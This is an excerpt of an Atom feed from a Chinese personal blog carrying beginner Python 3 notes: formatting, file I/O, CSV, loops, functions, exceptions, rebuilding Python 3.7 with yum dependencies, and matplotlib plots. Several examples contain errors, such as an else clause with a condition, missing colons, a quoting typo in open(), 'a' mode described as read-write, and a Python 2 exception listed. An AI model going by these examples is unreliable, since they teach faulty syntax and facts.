href="http://man.linuxde.net/">http://man.linuxde.net/</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;Linux--CentOS7.0&lt;/h1&gt;
&lt;p&gt;&lt;i&gt;2018-12-20&lt;/i&gt;&lt;br&gt;
趁着这一阶段系统性的把 Linux 的操作记录一下。&lt;br&gt;
结合着 《鸟哥私房菜》 以及学习的知识进行一个系统性的总结。&lt;br&gt;
关于 Linux，我目前的感受是----&lt;/p</summary>
      
    
    
    
    <category term="Operation" scheme="http://blog.dvkunion.cn/categories/Operation/"/>
    
    
    <category term="操作系统" scheme="http://blog.dvkunion.cn/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Linux" scheme="http://blog.dvkunion.cn/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>python3--learning--③</title>
    <link href="http://blog.dvkunion.cn/2018/10/20/python3-learning%E2%91%A2/"/>
    <id>http://blog.dvkunion.cn/2018/10/20/python3-learning%E2%91%A2/</id>
    <published>2018-10-20T08:48:03.000Z</published>
    <updated>2023-11-03T21:25:20.032Z</updated>
    
    <content type="html"><![CDATA[<div id="head"></div><h1>Python 3</h1><hr><h4 id="b-i-font-color-LightSkyBlue-目录-font-i-b"><b><i><font color = "LightSkyBlue">目录</font><i><b></h4><p><a href="/2018/10/17/python3-learning①/">①<br><a href="/2018/10/19/python3-learning②/">②<br><a href="/2018/10/20/python3-learning③/">③</p><ol><li><a href="#0x07">0x07--输入输出&amp;文件操作</a><ol><li><a href="#0x07-1">输入输出</a></li><li><a href="#0x07-2">文件操作</a></li></ol></li><li><a href="#0x08">0x08--CSV数据</a></li><li><a href="#0x09">0x09--系统监测</a><ol><li><a href="#0x04-1">工具使用</a></li></ol> <!--vmstat,iostat,top,sar,dstat,ifstat--><ol start="2"><li><a href="#0x04-2">类--class</a></li></ol></li><li><a href="#0x0A">0x0A--系统监测</a><ol><li><a href="#0x05-1"></a></li><li><a href="#0x05-2"></a></li></ol></li><li><a href="#0x0B">0X0B--插件和依赖支持安装</a></li></ol><hr><div id="0x07"></div><h3 id="b-0x07-输入输出-文件操作-b"><b>0x07- - 输入输出&amp;文件操作<b></h3><div id="0x07-1"></div><h4 id="font-color-blue-输入输出-font-br"><font color = "blue">输入输出</font><br></h4><p>输入：input()<br>输出：print()<br>输出字符串：str()/repr()<br>Python的输出自带换行，当我们想要进行不换行的输出时，应使用 end 参数。</p><p><code>print(&quot;不换行输出&quot;,end=&quot;&quot;)</code></p><p>当我们想要控制输出格式时候，可以使用占位符或format参数。<br>占位符要紧跟在其后：</p><p><code>print(&quot;int %d &quot; % 1+&quot;float %.3f &quot;% 2.3)</code></p><p>而format函数则需要位置映射/关键字映射/元素映射。<br>位置映射就是指默认的一一对应，一个萝卜一个坑：</p><p><code>print(&quot;&#123;&#125;,&#123;&#125;&quot;.format('第一个萝卜','第二个萝卜'))</code></p><p>关键字映射就是指key，类似占位一样,没人占的位置就遵循位置映射规则：</p><p><code>print(&quot;&#123;Lisi&#125;,&#123;Zhangsan&#125;,&#123;&#125;&quot;.format('noname',Lisi=&quot;Lisi's&quot;,Zhangsan=&quot;Zhangsan's&quot;))</code></p><p>关键字映射无视format函数内的参数位置。<br>最后的元素映射就是将format当作一个元组用下表访问：</p><p><code>print(&quot;&#123;0[0]&#125;,&#123;0[1]&#125;&quot;.format(('first','second')))</code></p><p>format还可以进行居中(^),左对齐(&lt;),右对齐(&gt;)操作<br>格式为：</p><p><code>&#123;索引:(填充符)(对齐符)(字符宽度)&#125;</code></p><p>例如</p><p><code>print(&quot;&#123;0&#125;,&#123;1&#125;=&#123;2:*&gt;3&quot;.format(3,2,2*3))</code></p><p>对于输入，有一个一行输入多个数据的方法：</p><p><code>a, b, c = map(int, input().split())</code></p><div id="0x07-2"></div><h4 id="font-color-blue-文件操作-font-br"><font color = "blue">文件操作</font><br></h4><p>open可以返回一个file对象</p><p><code>f = open(&quot;/tmp/test.txt,&quot;w&quot;)</code></p><p>第一个参数为路径&amp;文件名，第二个参数为mode模式，分为'r'只读、'w'只写、'a'读写。</p><p>对于file对象，存在以下的方法:</p><table><thead><tr><th>函数名称</th><th>函数功能</th></tr></thead><tbody><tr><td>f.read()</td><td>读取文件内容，返回str</td></tr><tr><td>f.readline()</td><td>读取文件的单独一行，遇到'\n'结束，返回str</td></tr><tr><td>f.readlines()</td><td>返回该文件中包含的所有行。如果设置可选参数 sizehint, 则读取指定长度的字节, 并且将这些字节按行分割。</td></tr><tr><td>f.write(str)</td><td>将一个str写入到文件内，然后返回写入字符数</td></tr><tr><td>f.tell()</td><td>返回文件对象当前所处的位置, 它是从文件开头开始算起的字节数。</td></tr><tr><td>f.seek()</td><td>seek(x,0) ： 从起始位置即文件首行首字符开始移动 x 个字符，seek(x,1) ： 表示从当前位置往后移动x个字符，seek(-x,2)：表示从文件的结尾往前移动x个字符</td></tr></tbody></table><div id="0x08"></div><h3 id="b-0x08-CSV数据-b"><b>0x08- - CSV数据<b></h3><p>     逗号分隔值(Comma-Separated Values，CSV，有时也称为字符分隔值，因为分隔字符也可以不是逗号)。其文件以纯文本形式存储表格数据（数字和文本）。纯文本意味着该文件是一个字符序列，不含必须像二进制数字那样被解读的数据。CSV文件由任意数目的记录组成，记录间以某种换行符分隔；每条记录由字段组成，字段间的分隔符是其它字符或字符串，最常见的是逗号或制表符。通常，所有记录都有完全相同的字段序列。通常都是纯文本文件。<br>存在以下特征的即可称为CSV格式：</p><ol><li>1.纯文本，使用某个字符集，比如ASCII、Unicode、EBCDIC或GB2312；</li><li>2.由记录组成（典型的是每行一条记录）；</li><li>3.每条记录被分隔符分隔为字段（典型分隔符有逗号、分号或制表符；有时分隔符可以包括可选的空格）；</li><li>4.每条记录都有同样的字段序列。</li></ol><p>Python中有内置的CSV库，可以方便的帮助处理CSV数据。</p><p><a href="#head"><center><font color = "Crimson">back --返回</font></center><br></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;div id=&quot;head&quot;&gt;&lt;/div&gt;
&lt;h1&gt;Python 3&lt;/h1&gt;
&lt;hr&gt;
&lt;h4 id=&quot;b-i-font-color-LightSkyBlue-目录-font-i-b&quot;&gt;&lt;b&gt;&lt;i&gt;&lt;font color = &quot;LightSkyBlue&quot;&gt;目录&lt;/font&gt;&lt;i</summary>
      
    
    
    
    <category term="Language" scheme="http://blog.dvkunion.cn/categories/Language/"/>
    
    
    <category term="脚本" scheme="http://blog.dvkunion.cn/tags/%E8%84%9A%E6%9C%AC/"/>
    
    <category term="Python3" scheme="http://blog.dvkunion.cn/tags/Python3/"/>
    
  </entry>
  
  <entry>
    <title>python3-learning--②</title>
    <link href="http://blog.dvkunion.cn/2018/10/19/python3-learning%E2%91%A1/"/>
    <id>http://blog.dvkunion.cn/2018/10/19/python3-learning%E2%91%A1/</id>
    <published>2018-10-19T16:07:18.000Z</published>
    <updated>2023-11-03T21:25:20.032Z</updated>
    
    <content type="html"><![CDATA[<div id="head"></div><h1>Python 3</h1><hr><h4 id="b-i-font-color-LightSkyBlue-目录-font-i-b"><b><i><font color = "LightSkyBlue">目录</font><i><b></h4><p><a href="/2018/10/17/python3-learning①/">①<br><a href="/2018/10/19/python3-learning②/">②</p><ol><li><a href="#0x03">0x03--控制结构</a><ol><li><a href="#0x03-1">if</a></li><li><a href="#0x03-2">for</a></li><li><a href="#0x03-3">while</a></li><li><a href="#0x03-4">it(迭代器)</a></li></ol></li><li><a href="#0x04">0x04--函数&amp;类</a><ol><li><a href="#0x04-1">函数--def</a></li><li><a href="#0x04-2">类--class</a></li></ol></li><li><a href="#0x05">0x05--错误&amp;异常</a><ol><li><a href="#0x05-1">错误</a></li><li><a href="#0x05-2">异常</a></li></ol></li><li><a href="#0x06">0X06--Python模块的安装(以Matplotlib为例)</a></li></ol><p><a href="/2018/10/20/python3-learning③/">③</p><hr><div id="0x03"></div><h3 id="b-0x03-控制结构-b"><b>0x03- - 控制结构<b></h3><div id="0x03-1"></div><h4 id="font-color-blue-if-font-br"><font color = "blue">if</font><br></h4><p>Python 中同样使用 if 来控制条件顺序结构。<br><br><b>--格式<b></p><p>Python 中一般if的写法如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> judge1 :</span><br><span class="line">execution <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> judge2 :</span><br><span class="line">execution <span class="number">2</span></span><br><span class="line"><span class="keyword">else</span> judge3 :</span><br><span class="line">execution <span class="number">3</span></span><br></pre></td></tr></table></figure><br><p><b>--常用运算符<b></p><table><thead><tr><th style="text-align:left">符号</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">&lt;</td><td style="text-align:left">小于</td></tr><tr><td style="text-align:left">&lt;=</td><td style="text-align:left">小于等于</td></tr><tr><td style="text-align:left">&gt;</td><td style="text-align:left">大于</td></tr><tr><td style="text-align:left">&gt;=</td><td style="text-align:left">大于等于</td></tr><tr><td style="text-align:left">==</td><td style="text-align:left">等于</td></tr><tr><td style="text-align:left">!=</td><td style="text-align:left">不等于</td></tr><tr><td style="text-align:left">x and y</td><td style="text-align:left">逻辑与</td></tr><tr><td style="text-align:left">x or y</td><td style="text-align:left">逻辑或</td></tr><tr><td style="text-align:left">not x</td><td style="text-align:left">逻辑非</td></tr></tbody></table><p><b>--注意<b></p><blockquote><p>P.S.<br>Python 中用 elif 代替了 else if，所以if语句的关键字为：if – elif – else<br>每个条件后面要使用冒号 :<br>使用缩进来划分语句块，相同缩进数的语句在一起组成一个语句块<br>在Python中没有switch – case语句</p></blockquote><div id="0x03-2"></div><h4 id="font-color-blue-for-font-br"><font color = "blue">for</font><br></h4><p>Python for循环可以遍历任何序列的项目，如一个列表或者一个字符串。<br><b>--格式<b></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> var <span class="keyword">in</span> sequence :</span><br><span class="line">execution</span><br></pre></td></tr></table></figure><p>其中 var 是变量 ，sequence 是序列，如列表、字符串<br>一般情况下使用 range 函数来生成一个数列方便使用。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line"><span class="built_in">print</span>(i) <span class="comment">#打印结果为1 2 3 4 </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(i) <span class="comment">#打印结果为0 1 2 3 4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>,<span class="number">3</span>) <span class="comment">#3代表步长</span></span><br><span class="line"><span class="built_in">print</span>(i) <span class="comment">#打印结果为0 3 6 9</span></span><br></pre></td></tr></table></figure><p>有了range()这个函数，我们可以配合len()轻松的遍历一个序列，如：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a))</span><br><span class="line"><span class="built_in">print</span>(i,a[i])</span><br><span class="line"><span class="comment">#打印结果为：</span></span><br><span class="line"><span class="comment">#0 a</span></span><br><span class="line"><span class="comment">#1 b</span></span><br><span class="line"><span class="comment">#2 c</span></span><br><span class="line"><span class="comment">#3 d</span></span><br></pre></td></tr></table></figure><p><b>--注意<b></p><blockquote><p>P.S.<br>循环结构中可以用 pass / continue 来跳过不需要的剩余语句<br>循环结构中可以用 break 来提前结束循环</p></blockquote><div id="0x03-3"></div><h4 id="font-color-blue-while-font-br"><font color = "blue">while</font><br></h4><p><b>--格式<b><br>Python中while语句的一般如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>/<span class="literal">False</span> :</span><br><span class="line">execution </span><br></pre></td></tr></table></figure><p><b>--注意<b></p><blockquote><p>P.S.<br>Python中没有do...while循环<br>while 之后仍可以接else 语句</p></blockquote><div id="0x03-4"></div><h4 id="font-color-blue-it-font-br"><font color = "blue">it</font><br></h4><p>it -- 迭代器<br>迭代器是访问集合元素的一种方式<br>迭代器是一个可以记住遍历的位置的对象。</p><p>迭代器对象从集合的第一个元素开始访问，直到所有的元素被访问完结束。迭代器只能往前不会后退。</p><p>迭代器有两个基本的方法：iter() 和 next()。<br>--格式</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">it = <span class="built_in">iter</span>(<span class="built_in">list</span>) <span class="comment">#创建迭代器对象</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">next</span>()) <span class="comment">#输出迭代器下一个元素</span></span><br></pre></td></tr></table></figure><p>可以使用it来进行遍历</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">it = <span class="built_in">iter</span>(<span class="built_in">list</span>)</span><br><span class="line"><span class="comment">#使用for来进行遍历</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> it:</span><br><span class="line"><span class="built_in">print</span>(i) </span><br><span class="line"><span class="comment">#或是用while来进行遍历</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(it))</span><br><span class="line"><span class="keyword">except</span> StopIteration :</span><br><span class="line">sys.exit() <span class="comment">#结束程序</span></span><br></pre></td></tr></table></figure><!--此处还有生成迭代器和初始化迭代器--><!--记得补上--><div id="0x04"></div><h3 id="b-0x04-函数-类-b"><b>0x04- - 函数&amp;类<b></h3><div id="0x04-1"></div><h4 id="font-color-blue-函数-font-br"><font color = "blue">函数</font><br></h4><h6 id="b-1-格式-b-br"><b>1.格式<b><br></h6><p>函数是一段组织好的，可重复使用的，来实现单一或相关联功能的代码段。<br>函数能够提高代码的模块性。<br>我们可以将一些方法封装成用户自定义函数，方便在之后进行多次调用。<br>在Python中该函数的格式为:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">name</span>(<span class="params">val1 , val2</span>):</span><br><span class="line">your code</span><br><span class="line"><span class="keyword">return</span> val3</span><br></pre></td></tr></table></figure><p>其中 def 是函数声明，告诉 python 要定义一个函数<br>name 是函数标识符名称，命名规则同Python标识符的命名<br>val1,val2被称作函数的参数<br>缩进后的内容为函数体<br>return 选择性的返回一个值给调用方法，没有return 相当于返回None</p><p>例如，将a+b写成函数操作的形式。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">plus</span>(<span class="params">a,b</span>):</span><br><span class="line"><span class="built_in">print</span>(a+b)</span><br><span class="line"></span><br><span class="line">c = <span class="number">1</span></span><br><span class="line">d = <span class="number">3</span></span><br><span class="line">plus(c,d)</span><br></pre></td></tr></table></figure><p>输出结果为4</p><h6 id="b-2-参数-b-br"><b>2.参数<b><br></h6><p>形参：函数定义时预设的参数<br>实参：实际使用时传递给函数的参数</p><p>在Python中，形参有4中表现形式:</p><ol><li>必须参数：如上例的a,b。即在引用时必须传入的参数。</li><li>关键词参数：在引用plus函数时还可以这样赋值:<br><code>plus(a=4,b=6)</code><br>或者<br><code>plus(b=6,a=4)</code><br>关键词参数使用时不需要指定顺序</li><li>默认参数：修改plus函数的形参格式如：<br><code>def plus(a,b=6)</code><br>这样plus函数中b参数已经有了默认值6<br>如果没有传入b的值时，b参数将使用默认值6</li><li>不定长参数：当不确定参数的长度时可以使用不定长参数。修改函数：</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">plus</span>(<span class="params"> *val </span>):</span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> val:</span><br><span class="line"><span class="built_in">sum</span>+=i</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br><span class="line">plus(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>输出结果为15<br>加了*的参数会以元组的形式导入函数，存放所有未命名的变量参数。<br>加了**的参数以字典的形式导入。<br>单独出现*后的参数必须用关键词参数的方式传入。</p><h6 id="b-3-参数传递-b-br"><b>3.参数传递<b><br></h6><p>在Python中，类型属于对象，变量没有类型。<br>上面的plus函数中，1,3属于Num类,而变量c，d则没有类型，他仅是一个Num对象的引用（类似于指针）。<br>在之前的总结中，Python有种可变类型，3种不可变类型。当函数传递的参数类型为不可变类型时，传递方式累死c++的值传递。传递的只是变量的值，不影响变量本身。<br>举个例子说明值传递：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pass_coin</span>(<span class="params">a</span>):</span><br><span class="line">a = <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;函数内的a的值为&quot;</span>+<span class="built_in">str</span>(a))</span><br><span class="line"></span><br><span class="line">a = <span class="number">5</span></span><br><span class="line">pass_coin(a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;外部实际的a的值为&quot;</span>+<span class="built_in">str</span>(a))</span><br></pre></td></tr></table></figure><p>输出结果为:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数内的a的值为10</span><br><span class="line">外部实际的a的值为5</span><br></pre></td></tr></table></figure><p>当函数传递的参数时可变类型时，则类似c++的引用传递（指针），如果参数被修改，那么外部实际值也会发生变化。<br>同样例如:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pass_coin</span>(<span class="params">a</span>):</span><br><span class="line">a[<span class="number">1</span>] = <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;函数内列表a的值为&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">pass_coin(a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;外部实际列表a的值为&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p>输出结果为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数内列表a的值为[1, 10, 3, 4, 5]</span><br><span class="line">外部实际列表a的值为[1, 10, 3, 4, 5]</span><br></pre></td></tr></table></figure><p>在这个例子中我们定义了一个可变的数据类型：列表a，在调用函数时把列表下标为 1 的值改变为10，发现不仅仅是函数内部a的值发生了变化,实际的列表a 的值已经被改变。</p><div id="0x04-2"></div><h4 id="font-color-blue-类-font-br"><font color = "blue">类</font><br></h4><p>类的操作和java中基本相似。python同样支持继承，多继承，方法重写，私有属性、方法，以及运算符重载</p><div id="0x05"></div><h3 id="b-0x05-错误-异常-b"><b>0x05- - 错误&amp;异常<b></h3><div id="0x05-1"></div><h4 id="font-color-blue-错误-font-br"><font color = "blue">错误</font><br></h4><p>错误一般指python代码中的语法错误</p><div id="0x05-2"></div><h4 id="font-color-blue-异常-font-br"><font color = "blue">异常</font><br></h4><h6 id="b-1-异常信息-b-br"><b>1.异常信息<b><br></h6><p>即使语法正确，程序在运行的过程中也可能发生错误。运行期间的错误被称作异常。<br>异常的种类有很多，如常见的：ZeroDivisionError,NameError,TypeError等等。</p><h6 id="b-2-异常处理-b-br"><b>2.异常处理<b><br></h6><p>异常处理的代码格式：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> :</span><br><span class="line"><span class="built_in">print</span>(<span class="number">5</span>/<span class="number">0</span>)</span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t divide by 0!&quot;</span>)</span><br></pre></td></tr></table></figure><p>except函数也可以同时处理多个异常，如：<br><code>except(RuntimeError,ZeroDivisionError):</code><br>try-except 还有一个可选的 else语句</p><h6 id="b-3-常见的Python异常类型-b-br"><b>3.常见的Python异常类型<b><br></h6><table><thead><tr><th style="text-align:left">异常名称</th><th style="text-align:left">异常描述</th></tr></thead><tbody><tr><td style="text-align:left">BaseException</td><td style="text-align:left">所有异常的基类</td></tr><tr><td style="text-align:left">SystemExit</td><td style="text-align:left">解释器请求退出</td></tr><tr><td style="text-align:left">KeyboardInterrupt</td><td style="text-align:left">用户中断执行(通常是输入^C)</td></tr><tr><td style="text-align:left">Exception</td><td style="text-align:left">常规错误的基类</td></tr><tr><td style="text-align:left">StopIteration</td><td style="text-align:left">迭代器没有更多的值</td></tr><tr><td style="text-align:left">GeneratorExit</td><td style="text-align:left">生成器(generator)发生异常来通知退出</td></tr><tr><td style="text-align:left">StandardError</td><td style="text-align:left">所有的内建标准异常的基类</td></tr><tr><td style="text-align:left">ArithmeticError</td><td style="text-align:left">所有数值计算错误的基类</td></tr><tr><td style="text-align:left">FloatingPointError</td><td style="text-align:left">浮点计算错误</td></tr><tr><td style="text-align:left">OverflowError</td><td style="text-align:left">数值运算超出最大限制</td></tr><tr><td style="text-align:left">ZeroDivisionError</td><td style="text-align:left">除(或取模)零 (所有数据类型)</td></tr><tr><td style="text-align:left">AssertionError</td><td style="text-align:left">断言语句失败</td></tr><tr><td style="text-align:left">AttributeError</td><td style="text-align:left">对象没有这个属性</td></tr><tr><td style="text-align:left">EOFError</td><td style="text-align:left">没有内建输入,到达EOF 标记</td></tr><tr><td style="text-align:left">EnvironmentError</td><td style="text-align:left">操作系统错误的基类</td></tr></tbody></table><div id="0x06"></div><h3 id="b-0x06-Python模块的安装-以Matplotlib为例-b"><b>0x06- - Python模块的安装(以Matplotlib为例)<b></h3><p>之前的安装缺少了部分环境导致Python最后的安装过程出现一个错误警告。导致Python3自带的Pip3未安装成功。我们重新安装一下依赖环境扩展包</p><h6 id="b-1-Python3-7-0依赖包-b-br"><b>1.Python3.7.0依赖包<b><br></h6><p><code>$ yum install -y gcc openssl* libffi libffi-devel zlib zlib-devel zlib-static readline-devel</code></p><h6 id="b-2-Matplotlib图形呈现依赖包-b-br"><b>2.Matplotlib图形呈现依赖包<b><br></h6><p><code>$ yum install -y tcl tk tk-devel</code></p><h6 id="b-3-重新安装Python3-b-br"><b>3.重新安装Python3<b><br></h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ tar -xzvf Python-<span class="number">3.7</span><span class="number">.0</span>.tgz </span><br><span class="line">$ cd Python-<span class="number">3.7</span><span class="number">.0</span>/</span><br><span class="line">$ ./configure --<span class="keyword">with</span>-ssl --<span class="keyword">with</span>-tcltk-includes=<span class="string">&quot;-I/usr/include&quot;</span> --<span class="keyword">with</span>-tcltk-libs=<span class="string">&quot;-L/usr/lib64 -ltcl8.5 -L/usr/lib64 -ltk8.5&quot;</span></span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br></pre></td></tr></table></figure><p>make install 结束后，会发现不会出现第一次安装时结尾的报错而是提示success<br>可以在命令行输入<br><code>$ python3</code><br>和<br><code>$ pip3</code><br>检测是否安装成功。</p><h6 id="b-4-Pip3安装matplotlib-b-br"><b>4.Pip3安装matplotlib<b><br></h6><p><code>$ pip3 install --index-url https://pypi.douban.com/simple matplotlib</code></p><h6 id="b-5-Matplotlib基本操作-b-br"><b>5.Matplotlib基本操作<b><br></h6><p>首先调用Matplotlib<br><code>import Matplotlib.pyplot as plt</code><br>调用了pyplot模块，并将它简化为plt，这样我们在后面的使用中就可以用plt来代替较长的pyplot。<br>来画一个简单的图像:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt </span><br><span class="line">squares = [<span class="number">1</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">16</span>,<span class="number">25</span>]</span><br><span class="line">plt.plot(squares)   <span class="comment">#plot()绘图函数</span></span><br><span class="line">plt.show()   <span class="comment">#show()打开matplotlib查看器并显示所绘图形</span></span><br></pre></td></tr></table></figure><p>运行输出如下：<br><img src="/img/006IjVYfgy1fxp1uzaoh9j30hs0dcdg0.jpg" alt=""></p><p>我们对输出的图片加一些修饰：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt </span><br><span class="line">squares = [<span class="number">1</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">16</span>,<span class="number">25</span>]</span><br><span class="line">plt.plot(squares,linewidth=<span class="number">5</span>) <span class="comment">#linewidth参数调整画线粗细</span></span><br><span class="line">plt.title(<span class="string">&quot;Square Number&quot;</span>,fontsize=<span class="number">24</span>) <span class="comment">#title方法为图片命名</span></span><br><span class="line">plt.xlabel(<span class="string">&quot;Value&quot;</span>,fontsize=<span class="number">14</span>) <span class="comment">#xlabel方法为X轴坐标命名</span></span><br><span class="line">plt.ylabel(<span class="string">&quot;Square of Value&quot;</span>,fontsize=<span class="number">14</span>) <span class="comment">#ylabel方法为Y轴坐标命名</span></span><br><span class="line">plt.tick_params(axis=<span class="string">&#x27;both&#x27;</span>,labelsize=<span class="number">14</span>) <span class="comment">#配置参数刻度线样式。</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>输出变为以下形式:<br><img src="/img/006IjVYfgy1fxp1wdy1ukj30hs0dct96.jpg" alt=""><br>plot方式画出的图默认是将各个点的值连接到一起，如果想要单独画出各个点，可以使用scatter的打印方式。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">x_values = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">y_values = [<span class="number">1</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">16</span>,<span class="number">25</span>]</span><br><span class="line">plt.scatter(x_values,y_values,s=<span class="number">10</span>)</span><br><span class="line">plt.title(<span class="string">&quot;Square Numbers&quot;</span>,fontsize=<span class="number">24</span>)</span><br><span class="line">plt.xlabel(<span class="string">&quot;Value&quot;</span>,fontsize=<span class="number">14</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;Square of Value&quot;</span>,fontsize=<span class="number">14</span>)</span><br><span class="line">plt.tick_params(axis=<span class="string">&#x27;both&#x27;</span>,labelsize=<span class="number">14</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>输出结果如下:<br><img src="/img/006IjVYfgy1fxp1hskwz3j30hs0dct8y.jpg" alt=""><br>把采样点加多，即可画出y=x*x的函数图像:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">x_values = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">51</span>))</span><br><span class="line">y_values = [x**<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> x_values]</span><br><span class="line">plt.scatter(x_values,y_values,s=<span class="number">40</span>)</span><br><span class="line">plt.xlabel(<span class="string">&quot;Values&quot;</span>,fontsize=<span class="number">14</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;Square of Values&quot;</span>,fontsize=<span class="number">14</span>)</span><br><span class="line">plt.axis([<span class="number">0</span>,<span class="number">60</span>,<span class="number">0</span>,<span class="number">3600</span>])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>输出如下:<br><img src="/img/006IjVYfgy1fxp1liowyxj30hs0dcweo.jpg" alt=""></p><p>也可以改变他的颜色：</p><blockquote><p>颜色表可以参考着单一色<br>red,blue,yellow,green,pink,black,brown,purple,orange<br><a href="https://matplotlib.org/tutorials/colors/colormaps.html">https://matplotlib.org/tutorials/colors/colormaps.html</a></p></blockquote><p>或是渐变色：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">x_values = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">51</span>))</span><br><span class="line">y_values = [x**<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> x_values]</span><br><span class="line">plt.scatter(x_values,y_values,c=y_values,</span><br><span class="line">cmap=plt.cm.Blues,s=<span class="number">40</span>)</span><br><span class="line">plt.xlabel(<span class="string">&quot;Values&quot;</span>,fontsize=<span class="number">14</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;Square of Values&quot;</span>,fontsize=<span class="number">14</span>)</span><br><span class="line">plt.axis([<span class="number">0</span>,<span class="number">60</span>,<span class="number">0</span>,<span class="number">3600</span>])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>输出结果如下：<br><img src="/img/006IjVYfgy1fxp1tah2slj30hs0dcgly.jpg" alt=""><br>这里放出常用的颜色表:<br><img src="/img/006IjVYfgy1fxp1the74jj30hu0dadjv.jpg" alt=""><br><img src="/img/006IjVYfgy1fxp1tplnlfj30hs0ddju2.jpg" 